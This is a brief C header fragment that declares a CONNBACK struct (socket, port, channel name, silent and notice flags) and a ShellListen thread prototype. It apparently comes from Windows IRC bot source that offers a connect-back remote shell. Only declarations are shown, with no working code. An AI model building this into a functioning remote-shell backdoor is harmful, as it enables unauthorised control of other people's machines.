#ifndef NO_CONNBACK
typedef struct CONNBACK
{
	SOCKET sock;
	int threadnum;
	int threads;
	int port;
	char chan[128];
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} CONNBACK;

DWORD WINAPI ShellListen(LPVOID pParam);
#endif